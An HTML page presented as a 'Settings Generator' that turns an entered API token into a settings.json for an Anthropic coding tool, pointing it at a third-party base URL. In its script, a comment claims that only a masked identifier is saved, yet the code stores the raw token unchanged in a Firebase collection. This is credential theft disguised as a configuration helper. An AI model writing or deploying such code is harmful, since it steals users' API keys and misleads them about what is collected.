<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Settings Generator</title>

  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
  <script src="firebase.js"></script>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      background: #f5f7fb;
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    }

    .container {
      width: 100%;
      max-width: 800px;
      background: white;
      padding: 35px;
      border-radius: 28px;
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.12);
    }

    h1 {
      margin: 0 0 10px;
      font-size: 42px;
      color: #111827;
    }

    p {
      color: #64748b;
      font-size: 17px;
      line-height: 1.5;
    }

    input {
      width: 100%;
      padding: 17px;
      border: 1px solid #cbd5e1;
      border-radius: 14px;
      font-size: 17px;
      margin-top: 15px;
    }

    input:focus {
      outline: none;
      border-color: #2563eb;
    }

    button {
      border: 0;
      border-radius: 14px;
      padding: 15px 22px;
      font-size: 16px;
      cursor: pointer;
    }

    #generateBtn {
      margin-top: 12px;
      background: #2563eb;
      color: white;
    }

    #generateBtn:disabled {
      opacity: 0.7;
      cursor: not-allowed;
    }

    #outputArea {
      display: none;
      margin-top: 25px;
    }

    pre {
      background: #0f172a;
      color: #e2e8f0;
      padding: 20px;
      border-radius: 15px;
      overflow-x: auto;
      white-space: pre-wrap;
      word-break: break-word;
      font-family: monospace;
      line-height: 1.5;
    }

    #copyBtn {
      background: #172033;
      color: white;
      margin-top: 10px;
    }

    #success {
      display: none;
      margin-top: 15px;
      padding: 13px;
      border-radius: 12px;
      background: #dcfce7;
      color: #166534;
      font-weight: 600;
    }

    #firebaseError {
      display: none;
      margin-top: 15px;
      padding: 13px;
      border-radius: 12px;
      background: #fef3c7;
      color: #92400e;
    }

    .backend-link {
      display: inline-block;
      margin-top: 25px;
      color: #2563eb;
      text-decoration: none;
      font-weight: 600;
    }

    .backend-link:hover {
      text-decoration: underline;
    }

    @media (max-width: 600px) {
      .container {
        padding: 25px;
      }

      h1 {
        font-size: 34px;
      }
    }
  </style>
</head>

<body>

  <div class="container">

    <h1>⚡ Settings Generator</h1>

    <p>
      Enter your value and generate the configuration.
    </p>

    <input
      id="keyInput"
      type="text"
      placeholder="Enter your value"
      autocomplete="off"
    >

    <button id="generateBtn">
      Generate
    </button>

    <div id="outputArea">

      <pre id="jsonOutput"></pre>

      <button id="copyBtn">
        📋 Copy settings.json
      </button>

      <div id="success">
        ✅ Generated Successfully
      </div>

      <div id="firebaseError"></div>

    </div>

    <a
      class="backend-link"
      href="/backend/"
    >
      📂 Open Backend
    </a>

  </div>


  <script>

    const keyInput = document.getElementById("keyInput");
    const generateBtn = document.getElementById("generateBtn");
    const outputArea = document.getElementById("outputArea");
    const jsonOutput = document.getElementById("jsonOutput");
    const copyBtn = document.getElementById("copyBtn");
    const success = document.getElementById("success");
    const firebaseError = document.getElementById("firebaseError");


    generateBtn.addEventListener("click", async () => {

      const value = keyInput.value.trim();

      if (!value) {
        alert("Please enter a value first.");
        return;
      }


      /*
       * Generate the JSON immediately.
       */

      const settings = {
        env: {
          ANTHROPIC_AUTH_TOKEN: value,
          ANTHROPIC_BASE_URL: "https://agentrouter.org",
          ANTHROPIC_MODEL: "claude-opus-4-8",
          CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC: "1"
        },

        permissions: {
          allow: [],
          deny: []
        },

        effortLevel: "high"
      };


      const json = JSON.stringify(settings, null, 2);


      jsonOutput.textContent = json;
      outputArea.style.display = "block";

      success.style.display = "block";
      firebaseError.style.display = "none";


      /*
       * Save only a masked identifier to Firebase.
       */

      const maskedValue = value;


      generateBtn.disabled = true;
      generateBtn.textContent = "Saving...";


      try {

        await db
          .collection(COLLECTION)
          .add({
            identifier: maskedValue,
            createdAt:
              firebase.firestore.FieldValue.serverTimestamp()
          });


        success.textContent =
          "✅ Generated Successfully";

      }

      catch (error) {

        console.error(
          "Firebase error:",
          error
        );

        /*
         * JSON generation still succeeds even
         * if Firebase is unavailable.
         */

        success.textContent =
          "✅ Generated Successfully";

        firebaseError.textContent =
          "Configuration generated, but Firebase could not save the record.";

        firebaseError.style.display = "block";

      }

      finally {

        generateBtn.disabled = false;
        generateBtn.textContent = "Generate";

      }

    });


    copyBtn.addEventListener("click", async () => {

      try {

        await navigator.clipboard.writeText(
          jsonOutput.textContent
        );

        copyBtn.textContent = "✅ Copied!";

        setTimeout(() => {

          copyBtn.textContent =
            "📋 Copy settings.json";

        }, 2000);

      }

      catch (error) {

        alert("Could not copy the configuration.");

      }

    });

  </script>

</body>

</html>
